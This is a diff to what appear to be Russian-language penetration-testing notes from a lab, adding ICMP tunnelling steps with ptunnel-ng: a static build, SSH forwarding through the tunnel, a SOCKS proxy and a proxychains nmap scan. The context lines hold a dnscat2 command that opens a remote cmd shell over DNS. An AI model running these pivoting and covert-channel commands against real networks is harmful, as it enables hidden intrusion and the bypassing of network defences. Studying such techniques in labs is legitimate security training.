@@ -486,6 +486,30 @@ route add 10.10.10.0/23 mask 255.255.254.0 192.168.50.123
 		Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
 		window -i 1
 		
+# Прокладка туннелей ICMP с использованием SOCKS 
+
+		git clone https://github.com/utoni/ptunnel-ng.git
+		создание статического файла
+		sudo apt install automake autoconf -y
+		cd ptunnel-ng/
+		sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
+		./autogen.sh
+
+		scp -r ptunnel-ng ubuntu@10.129.202.64:~/
+		
+		Запуск сервера ptunnel-ng на промежуточном хосте
+		sudo ./ptunnel-ng -r10.129.202.64 -R22
+
+		Подключение к серверу ptunnel-ng с хоста атаки. 
+		sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+
+		Проведение туннелирования SSH-соединения через ICMP-туннель 
+		ssh -p2222 -lubuntu 127.0.0.1
+		ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+
+		proxychains nmap -sV -sT 172.16.5.19 -p3389
+
+		
 # Смена таблици маршрутицации 
 
 	sudo ip route add 192.168.134.0/24 via 10.200.100.6
